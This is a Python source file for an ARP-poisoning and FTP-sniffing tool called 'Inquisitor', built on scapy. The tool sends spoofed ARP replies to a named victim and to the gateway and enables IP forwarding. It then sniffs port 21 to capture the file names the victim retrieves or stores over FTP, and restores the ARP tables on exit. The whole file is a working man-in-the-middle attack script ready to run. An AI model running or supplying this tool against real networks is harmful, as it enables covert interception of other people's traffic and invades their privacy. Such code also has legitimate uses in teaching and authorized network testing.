
import argparse
import sys
import time
import os
import threading
from scapy.all import *

def parse_args():
    parser = argparse.ArgumentParser(description="ARP Poisoning and FTP Sniffer Tool - Inquisitor")
    parser.add_argument("ip_src", help="Source IP (Gateway/Router IP)")
    parser.add_argument("mac_src", help="Source MAC (Gateway/Router MAC)")
    parser.add_argument("ip_target", help="Target IP (Victim IP)")
    parser.add_argument("mac_target", help="Target MAC (Victim MAC)")
    
    if len(sys.argv) != 5:
        parser.print_help()
        sys.exit(1)
        
    args = parser.parse_args()
    return args

def restore(ip_src, mac_src, ip_target, mac_target):
    print("\n[*] Restoring ARP tables using broadcast...", flush=True)
    
    l2_broadcast_packet_for_target = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=ip_target, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_src, hwsrc=mac_src)
    l2_broadcast_packet_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=ip_src, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_target, hwsrc=mac_target)
    
    sendp(l2_broadcast_packet_for_target, count=4, verbose=False)
    sendp(l2_broadcast_packet_for_gateway, count=4, verbose=False)
    print("[*] ARP tables restored.", flush=True)

def poison_loop(ip_src, mac_src, ip_target, mac_target):
    l2_packet_for_target = Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src)
    l2_packet_for_gateway = Ether(dst=mac_src) / ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target)
    
    print("[*] Starting ARP poisoning... Press CTRL+C to stop.", flush=True)
    while True:
        try:
            sendp(l2_packet_for_target, verbose=False)
            sendp(l2_packet_for_gateway, verbose=False)
            time.sleep(1)
        except KeyboardInterrupt:
            break

def ftp_sniffer(packet):
    if not packet.haslayer(IP) or packet[IP].src != args.ip_target:
        return

    if packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode("utf-8", errors="ignore").strip()
            if payload.upper().startswith("RETR ") or payload.upper().startswith("STOR "):
                print(f"\n[+] FTP Filename detected: {payload}\n", flush=True)
        except Exception:
            pass

def main():
    global args
    args = parse_args()
    
    print(f"[*] Starting Inquisitor...")
    print(f"    -> Gateway: {args.ip_src} ({args.mac_src})")
    print(f"    -> Target:  {args.ip_target} ({args.mac_target})")

    print("[*] Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    poison_thread = threading.Thread(target=poison_loop, args=(args.ip_src, args.mac_src, args.ip_target, args.mac_target))
    poison_thread.daemon = True
    poison_thread.start()
    
    print("[*] Poisoning in progress. Waiting a moment...")
    time.sleep(2)

    print("[*] Starting FTP sniffer on port 21...")
    try:
        sniff(iface="eth0", filter="tcp port 21", prn=ftp_sniffer, store=False)
    except Exception as e:
        print(f"[!] An error occurred during sniffing: {e}")
    finally:
        restore(args.ip_src, args.mac_src, args.ip_target, args.mac_target)
        print("[*] Disabling IP forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] Inquisitor shut down.")

if __name__ == '__main__':
    main()
